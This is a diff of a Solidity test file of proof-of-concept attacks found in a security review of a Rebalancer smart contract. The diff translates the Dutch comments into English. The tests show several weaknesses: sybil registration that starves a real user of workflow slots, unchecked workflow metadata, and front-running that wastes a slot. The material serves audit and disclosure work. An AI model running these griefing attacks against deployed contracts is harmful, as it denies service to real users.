@@ -6,12 +6,12 @@ import {Rebalancer} from "repo/src/Rebalancer.sol";
 
 contract CrePoC is RebalancerTestBase {
     function _meta(bytes32 wfId, address wfOwner) internal pure returns (bytes memory) {
-        // 64 bytes, zoals KeystoneForwarder rawReport[45:109] aanlevert
+        // 64 bytes, as KeystoneForwarder rawReport[45:109] delivers
         return abi.encodePacked(wfId, bytes10("whatever"), wfOwner, bytes2(0x0001));
     }
 
-    /// PoC-1: slot-starvation. 6 owners, "sybil" 1-5 registreren eerst met dust-params (band 1 bps, cap 1 bps,
-    /// minTrade 1, interval 1 uur). De workflow neemt dueOwners(0,50)[:5]; owner 6 komt nooit aan de beurt.
+    /// PoC-1: slot starvation. 6 owners, "sybil" 1-5 register first with dust params (band 1 bps, cap 1 bps,
+    /// minTrade 1, interval 1 hour). The workflow takes dueOwners(0,50)[:5]; owner 6 never gets a turn.
     function test_poc_starvationByRegistrationOrder() public {
         Rebalancer.Params memory dust = Rebalancer.Params({
             active: true, targetBps: 8000, bandBps: 1, maxCorrectionBps: 1, minTradeEurc: 1, interval: 1 hours, maxSlippageBps: 100
@@ -19,34 +19,34 @@ contract CrePoC is RebalancerTestBase {
         address[5] memory sybil;
         for (uint256 i = 0; i < 5; i++) {
             sybil[i] = makeAddr(string(abi.encodePacked("sybil", i)));
-            _setUser(sybil[i], 1000e6, 0, dust); // 100% EURC, target 80%: drift 80% >> band, trade = 1 bps van 1000 = 0,1 EURC
+            _setUser(sybil[i], 1000e6, 0, dust); // 100% EURC, target 80%: drift 80% >> band, trade = 1 bps of 1000 = 0.1 EURC
         }
-        _setUser(alice, 1000e6, 0, _defaultParams()); // echte gebruiker, registreert als zesde
+        _setUser(alice, 1000e6, 0, _defaultParams()); // real user, registers sixth
 
         _hour(START + 1, sybil);
         _hour(START + 1 hours + 1, sybil);
         _hour(START + 2 hours + 1, sybil);
-        // Kosten voor de aanvaller: 5 x 0,1 EURC per uur verplaatst tegen 25 bps fee = 0,00125 EURC/uur.
-        emit log_named_uint("treasury-fee na 15 dust-runs (EURC-basiseenheden)", eurc.balanceOf(treasury));
-        assertLt(eurc.balanceOf(treasury), 5_000, "fee dekt de CRE-gaskosten niet");
+        // Cost to the attacker: 5 x 0.1 EURC moved per hour at 25 bps fee = 0.00125 EURC/hour.
+        emit log_named_uint("treasury fee after 15 dust runs (EURC base units)", eurc.balanceOf(treasury));
+        assertLt(eurc.balanceOf(treasury), 5_000, "fee does not cover the CRE gas cost");
     }
 
     function _hour(uint256 ts, address[5] memory sybil) internal {
         vm.warp(ts);
-        _setPrice(PRICE); // feeds vers houden (heartbeat), zoals op mainnet
+        _setPrice(PRICE); // keep feeds fresh (heartbeat), as on mainnet
         address[] memory due = r.dueOwners(0, 50);
         emit log_named_uint("ts", ts);
         emit log_named_uint("  due.length", due.length);
-        assertEq(due.length, 6, "alle zes zijn due");
+        assertEq(due.length, 6, "all six are due");
         address[] memory report = new address[](5);
         for (uint256 i = 0; i < 5; i++) report[i] = due[i];
         vm.prank(forwarder);
         r.onReport(_meta(bytes32(uint256(1)), workflowOwner), abi.encode(report));
-        for (uint256 i = 0; i < 5; i++) assertEq(uint256(r.lastExecutedAt(sybil[i])), ts, "sybil bediend");
-        assertEq(r.lastExecutedAt(alice), 0, "alice wordt nooit bediend via CRE");
+        for (uint256 i = 0; i < 5; i++) assertEq(uint256(r.lastExecutedAt(sybil[i])), ts, "sybil served");
+        assertEq(r.lastExecutedAt(alice), 0, "alice is never served via CRE");
     }
 
-    /// PoC-2: 5 owners die elk (bijna) het volledige EXECUTE_GAS verbruiken passen in ~3,7M gas.
+    /// PoC-2: 5 owners that each use (almost) the full EXECUTE_GAS fit in ~3.7M gas.
     function test_poc_fiveFullBudgetOwnersFit() public {
         uint256[6] memory burns = [uint256(0), 100_000, 150_000, 200_000, 225_000, 250_000];
         for (uint256 b = 0; b < burns.length; b++) {
@@ -64,14 +64,14 @@ contract CrePoC is RebalancerTestBase {
             uint256 executed;
             for (uint256 i = 0; i < 5; i++) if (r.lastExecutedAt(list[i]) != 0) executed++;
             emit log_named_uint("burn", burns[b]);
-            emit log_named_uint("  executed of 5 (3.7M gas)", executed);
+            emit log_named_uint("  executed out of 5 (3.7M gas)", executed);
             emit log_named_uint("  onReport gas used", used);
             vm.revertToState(snap);
         }
     }
 
-    /// PoC-3: metadata korter dan 62 bytes laat de hele call reverten (geen try/catch daar); 64 bytes van de
-    /// forwarder wordt gewoon geaccepteerd; workflowId en -naam worden niet gecontroleerd.
+    /// PoC-3: metadata shorter than 62 bytes makes the whole call revert (no try/catch there); 64 bytes from the
+    /// forwarder is simply accepted; workflowId and name are not checked.
     function test_poc_metadataHandling() public {
         _setUser(alice, 1000e6, 0, _defaultParams());
         address[] memory list = new address[](1);
@@ -80,11 +80,11 @@ contract CrePoC is RebalancerTestBase {
         vm.expectRevert();
         r.onReport(hex"00", abi.encode(list));
         vm.prank(forwarder);
-        r.onReport(_meta(keccak256("andere-workflow-zelfde-owner"), workflowOwner), abi.encode(list));
+        r.onReport(_meta(keccak256("other-workflow-same-owner"), workflowOwner), abi.encode(list));
         assertEq(r.lastExecutedAt(alice), uint64(START));
     }
 
-    /// PoC-4: replay van hetzelfde rapport is op contractniveau onschadelijk (NotDue).
+    /// PoC-4: replaying the same report is harmless at contract level (NotDue).
     function test_poc_replayIsIdempotent() public {
         _setUser(alice, 1000e6, 0, _defaultParams());
         address[] memory list = new address[](1);
@@ -100,8 +100,8 @@ contract CrePoC is RebalancerTestBase {
         assertEq(eurc.balanceOf(alice), bal);
     }
 
-    /// PoC-5: een owner die vlak voor het rapport zelf execute aanroept (of via een derde) steelt het slot;
-    /// het rapport slaat hem over met NotDue. Onschadelijk voor fondsen, wel verspilling van een van de 5 slots.
+    /// PoC-5: an owner who calls execute himself just before the report (or via a third party) steals the slot;
+    /// the report skips him with NotDue. Harmless for funds, but wastes one of the 5 slots.
     function test_poc_frontrunSlot() public {
         _setUser(alice, 1000e6, 0, _defaultParams());
         r.execute(alice, bob);
